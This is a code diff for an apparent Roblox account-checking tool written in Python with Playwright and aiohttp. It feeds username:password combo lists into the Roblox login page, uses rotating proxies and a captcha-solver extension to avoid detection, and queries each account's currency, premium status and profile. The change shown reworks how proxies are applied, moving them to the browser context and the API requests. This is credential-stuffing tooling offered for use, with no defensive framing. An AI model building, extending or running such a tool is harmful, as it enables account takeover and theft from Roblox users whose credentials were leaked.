@@ -190,12 +190,13 @@ async def fetch_account_details_api(session, user_id, roblox_security, console: 
     proxy_index = 0
     for attempt in range(2):
         proxy = get_random_proxy(proxies, proxy_index)
+        proxy_dict = {"server": proxy} if proxy else None
         try:
             await asyncio.sleep(CONFIG["api_delay"])
             async with session.get(
                 f"https://economy.roblox.com/v1/users/{user_id}/currency",
                 headers=headers,
-                proxy=proxy
+                proxy=proxy_dict["server"] if proxy_dict else None
             ) as response:
                 if response.status == 200:
                     data = await response.json()
@@ -215,12 +216,13 @@ async def fetch_account_details_api(session, user_id, roblox_security, console: 
             break
     for attempt in range(2):
         proxy = get_random_proxy(proxies, proxy_index)
+        proxy_dict = {"server": proxy} if proxy else None
         try:
             await asyncio.sleep(CONFIG["api_delay"])
             async with session.get(
                 f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                 headers=headers,
-                proxy=proxy
+                proxy=proxy_dict["server"] if proxy_dict else None
             ) as response:
                 if response.status == 200:
                     details["is_premium"] = "Yes" if (await response.json()).get("isPremium", False) else "No"
@@ -238,12 +240,13 @@ async def fetch_account_details_api(session, user_id, roblox_security, console: 
             break
     for attempt in range(2):
         proxy = get_random_proxy(proxies, proxy_index)
+        proxy_dict = {"server": proxy} if proxy else None
         try:
             await asyncio.sleep(CONFIG["api_delay"])
             async with session.get(
                 f"https://users.roblox.com/v1/users/{user_id}",
                 headers=headers,
-                proxy=proxy
+                proxy=proxy_dict["server"] if proxy_dict else None
             ) as response:
                 if response.status == 200:
                     data = await response.json()
@@ -331,14 +334,8 @@ async def login_worker(queue, context, semaphore, output_dir, proxies, max_proxi
             try:
                 combo = await queue.get()
                 username, password = combo.split(":", 1)
-                proxy = get_random_proxy(proxies, proxy_index) if max_proxies_per_account > 0 else None
                 page = await context.new_page()
                 pages.append(page)
-                if proxy:
-                    try:
-                        await page.route("**", lambda route: route.continue_(proxy=proxy))
-                    except Exception as e:
-                        print(f"Proxy apply failed: {str(e)}")
                 try:
                     await page.goto("https://www.roblox.com/login", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
                     await page.fill("input#login-username", username)
@@ -436,14 +433,17 @@ async def check_accounts():
                     browser_kwargs["args"].append("--disable-extensions-except=" + str(get_temp_dir() / "nopecha"))
 
             browser = await p.chromium.launch(**browser_kwargs)
+            proxy_index = 0
+            proxy = get_random_proxy(proxies, proxy_index) if use_proxies else None
+            proxy_dict = {"server": proxy} if proxy else None
             context = await browser.new_context(
                 user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-                viewport={"width": 1280, "height": 720}
+                viewport={"width": 1280, "height": 720},
+                proxy=proxy_dict
             )
 
             semaphore = asyncio.Semaphore(max_tasks)
             tasks = []
-            proxy_index = 0
             for _ in range(max_tasks):
                 task = asyncio.create_task(login_worker(queue, context, semaphore, output_dir, proxies, 1 if use_proxies else 0, console, use_captcha_solver, proxy_index, pages, results))
                 tasks.append(task)
